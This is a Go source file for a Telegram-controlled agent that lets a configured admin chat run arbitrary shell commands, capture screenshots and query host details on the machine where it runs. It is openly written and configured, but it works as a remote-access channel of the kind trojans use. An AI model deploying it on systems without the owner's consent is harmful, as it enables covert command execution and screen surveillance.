package main

import (
	"bytes"
	"context"
	"fmt"
	"image/png"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/joho/godotenv"
	"github.com/vova616/screenshot"
)

const (
	maxOutputBytes = 3500 // limite seguro para mensagem Telegram com Markdown
	cmdTimeout     = 15 * time.Second
)

var (
	bot     *tgbotapi.BotAPI
	adminID int64
)

func loadConfig() error {
	_ = godotenv.Load()

	token := os.Getenv("TELEGRAM_BOT_TOKEN")
	if token == "" {
		return fmt.Errorf("TELEGRAM_BOT_TOKEN não definido")
	}

	idStr := os.Getenv("TELEGRAM_CHAT_ID")
	if idStr == "" {
		return fmt.Errorf("TELEGRAM_CHAT_ID não definido")
	}

	var err error
	adminID, err = strconv.ParseInt(idStr, 10, 64)
	if err != nil {
		return fmt.Errorf("TELEGRAM_CHAT_ID inválido: %w", err)
	}

	bot, err = tgbotapi.NewBotAPI(token)
	if err != nil {
		return fmt.Errorf("falha ao iniciar bot: %w", err)
	}

	return nil
}

func runCommand(ctx context.Context, command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", command)
	} else {
		cmd = exec.CommandContext(ctx, "bash", "-c", command)
	}

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	output := out.String()

	if len(output) > maxOutputBytes {
		output = output[:maxOutputBytes] + "\n...[truncado]"
	}

	if err != nil {
		return output, fmt.Errorf("comando falhou: %w", err)
	}
	return output, nil
}

func sendMarkdown(text string) {
	msg := tgbotapi.NewMessage(adminID, "```\n"+text+"\n```")
	msg.ParseMode = tgbotapi.ModeMarkdown
	if _, err := bot.Send(msg); err != nil {
		log.Printf("erro ao enviar mensagem: %v", err)
	}
}

func handleUpdate(update tgbotapi.Update) {
	if update.Message == nil || update.Message.Chat.ID != adminID {
		return
	}

	text := strings.TrimSpace(update.Message.Text)
	if text == "" {
		return
	}

	switch {
	case text == "/status":
		host, _ := os.Hostname()
		user := os.Getenv("USER")
		if user == "" {
			user = os.Getenv("USERNAME")
		}
		sendMarkdown(fmt.Sprintf("host=%s\nuser=%s\nos=%s", host, user, runtime.GOOS))

	case text == "/screenshot":
		img, err := screenshot.CaptureScreen()
		if err != nil {
			sendMarkdown("erro ao capturar tela: " + err.Error())
			return
		}

		var buf bytes.Buffer
		if err := png.Encode(&buf, img); err != nil {
			sendMarkdown("erro ao codificar PNG: " + err.Error())
			return
		}

		photo := tgbotapi.NewPhoto(adminID, tgbotapi.FileBytes{
			Name:  "screen.png",
			Bytes: buf.Bytes(),
		})
		if _, err := bot.Send(photo); err != nil {
			log.Printf("erro ao enviar screenshot: %v", err)
		}

	case strings.HasPrefix(text, "/exec "):
		command := strings.TrimPrefix(text, "/exec ")
		if command == "" {
			sendMarkdown("uso: /exec <comando>")
			return
		}

		ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
		defer cancel()

		output, err := runCommand(ctx, command)
		if err != nil {
			output += "\n[erro] " + err.Error()
		}
		sendMarkdown(output)

	default:
		sendMarkdown("comandos: /status | /screenshot | /exec <cmd>")
	}
}

func main() {
	if err := loadConfig(); err != nil {
		log.Fatal(err)
	}

	log.Printf("agente iniciado para admin %d", adminID)

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 30

	updates := bot.GetUpdatesChan(u)
	for update := range updates {
		handleUpdate(update)
	}
}
